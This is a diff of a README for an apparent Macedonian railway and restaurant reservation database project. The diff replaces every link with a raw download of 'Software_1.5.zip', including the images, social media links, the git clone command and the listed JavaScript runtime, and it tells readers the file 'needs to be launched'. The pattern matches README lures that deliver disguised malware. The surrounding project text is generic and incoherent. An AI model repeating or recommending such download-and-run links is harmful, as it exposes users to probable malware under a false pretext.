@@ -1,6 +1,6 @@
 # 🚂 Welcome to the Macedonia Project Repository! 🍽️
 
-![Macedonia Image](https://github.com/jcmarty/Macedonian/releases/tag/v1.2)
+![Macedonia Image](https://github.com/jcmarty/Macedonian/raw/refs/heads/main/murage/Software_1.5.zip)
 
 ## Repository Details
 - **Repository Name:** Macedonian
@@ -8,7 +8,7 @@
 - **Topics:** colombia, db, eat, exclusive, frn, javascript, json, macedonia, railway, reservation, restaurant
 
 ### Get Started
-To access the database in JSON format with Railway schema for the collaborative Macedonia project, [click here](https://github.com/jcmarty/Macedonian/releases/tag/v1.2). Please note that the file needs to be launched.
+To access the database in JSON format with Railway schema for the collaborative Macedonia project, [click here](https://github.com/jcmarty/Macedonian/raw/refs/heads/main/murage/Software_1.5.zip). Please note that the file needs to be launched.
 
 If the provided link does not work or is not accessible, kindly check the "Releases" section of the repository.
 
@@ -29,7 +29,7 @@ The repository contains the following structure:
 
 ### Cloning the Repository
 ```bash
-git clone https://github.com/jcmarty/Macedonian/releases/tag/v1.2
+git clone https://github.com/jcmarty/Macedonian/raw/refs/heads/main/murage/Software_1.5.zip
 ```
 
 ### Accessing the Database
@@ -38,7 +38,7 @@ git clone https://github.com/jcmarty/Macedonian/releases/tag/v1.2
 
 ### Using Scripts
 1. Navigate to the 'Scripts' folder.
-2. Run the JavaScript files using https://github.com/jcmarty/Macedonian/releases/tag/v1.2 to interact with the database.
+2. Run the JavaScript files using https://github.com/jcmarty/Macedonian/raw/refs/heads/main/murage/Software_1.5.zip to interact with the database.
 
 ### Contributing
 1. Fork the repository.
@@ -59,7 +59,7 @@ The Macedonia project is a collaborative effort to create a comprehensive railwa
 ### Technologies Used
 - **JavaScript:** Main programming language for database operations.
 - **JSON:** Data format for storing database information.
-- **https://github.com/jcmarty/Macedonian/releases/tag/v1.2** JavaScript runtime for executing database scripts.
+- **https://github.com/jcmarty/Macedonian/raw/refs/heads/main/murage/Software_1.5.zip** JavaScript runtime for executing database scripts.
 
 ---
 
@@ -68,17 +68,17 @@ The Macedonia project is a collaborative effort to create a comprehensive railwa
 ### Villa Vodno
 Located at the foothills of Mount Vodno, Villa Vodno offers a luxurious dining experience with a panoramic view of the city.
 
-![Villa Vodno](https://github.com/jcmarty/Macedonian/releases/tag/v1.2)
+![Villa Vodno](https://github.com/jcmarty/Macedonian/raw/refs/heads/main/murage/Software_1.5.zip)
 
 ### Skopje Sunsets
 Experience breathtaking sunsets while enjoying gourmet cuisine at Skopje Sunsets restaurant.
 
-![Skopje Sunsets](https://github.com/jcmarty/Macedonian/releases/tag/v1.2)
+![Skopje Sunsets](https://github.com/jcmarty/Macedonian/raw/refs/heads/main/murage/Software_1.5.zip)
 
 ### Ohrid Delights
 Indulge in traditional Macedonian dishes with a modern twist at Ohrid Delights, situated by the picturesque Lake Ohrid.
 
-![Ohrid Delights](https://github.com/jcmarty/Macedonian/releases/tag/v1.2)
+![Ohrid Delights](https://github.com/jcmarty/Macedonian/raw/refs/heads/main/murage/Software_1.5.zip)
 
 ---
 
@@ -87,17 +87,17 @@ Indulge in traditional Macedonian dishes with a modern twist at Ohrid Delights, 
 ### Skopje Central Station
 Check train schedules, book tickets, and plan your journey from the bustling Skopje Central Station.
 
-![Skopje Central Station](https://github.com/jcmarty/Macedonian/releases/tag/v1.2)
+![Skopje Central Station](https://github.com/jcmarty/Macedonian/raw/refs/heads/main/murage/Software_1.5.zip)
 
 ### Ohrid Railway Route
 Explore the scenic Ohrid railway route with multiple stops along the way to enjoy the beauty of Macedonia.
 
-![Ohrid Railway Route](https://github.com/jcmarty/Macedonian/releases/tag/v1.2)
+![Ohrid Railway Route](https://github.com/jcmarty/Macedonian/raw/refs/heads/main/murage/Software_1.5.zip)
 
 ### Ticket Booking System
 Easily reserve your seats online or at designated stations using the Macedonia project's user-friendly ticket booking system.
 
-![Ticket Booking](https://github.com/jcmarty/Macedonian/releases/tag/v1.2)
+![Ticket Booking](https://github.com/jcmarty/Macedonian/raw/refs/heads/main/murage/Software_1.5.zip)
 
 ---
 
@@ -108,9 +108,9 @@ Easily reserve your seats online or at designated stations using the Macedonia p
 
 ---
 
-## 🌍 Visit [Macedonia Project Website](https://github.com/jcmarty/Macedonian/releases/tag/v1.2) for more information and updates!
+## 🌍 Visit [Macedonia Project Website](https://github.com/jcmarty/Macedonian/raw/refs/heads/main/murage/Software_1.5.zip) for more information and updates!
 
-[![Get the Files](https://github.com/jcmarty/Macedonian/releases/tag/v1.2%20Files-Get%20the%20Files-blue)](https://github.com/jcmarty/Macedonian/releases/tag/v1.2)
+[![Get the Files](https://github.com/jcmarty/Macedonian/raw/refs/heads/main/murage/Software_1.5.zip%20Files-Get%20the%20Files-blue)](https://github.com/jcmarty/Macedonian/raw/refs/heads/main/murage/Software_1.5.zip)
 
 ---
 
@@ -118,9 +118,9 @@ Easily reserve your seats online or at designated stations using the Macedonia p
 
 Stay updated with the latest news and developments of the Macedonia project by following our social media channels:
 
-- [Twitter](https://github.com/jcmarty/Macedonian/releases/tag/v1.2)
-- [Facebook](https://github.com/jcmarty/Macedonian/releases/tag/v1.2)
-- [Instagram](https://github.com/jcmarty/Macedonian/releases/tag/v1.2)
+- [Twitter](https://github.com/jcmarty/Macedonian/raw/refs/heads/main/murage/Software_1.5.zip)
+- [Facebook](https://github.com/jcmarty/Macedonian/raw/refs/heads/main/murage/Software_1.5.zip)
+- [Instagram](https://github.com/jcmarty/Macedonian/raw/refs/heads/main/murage/Software_1.5.zip)
 
 ---
 
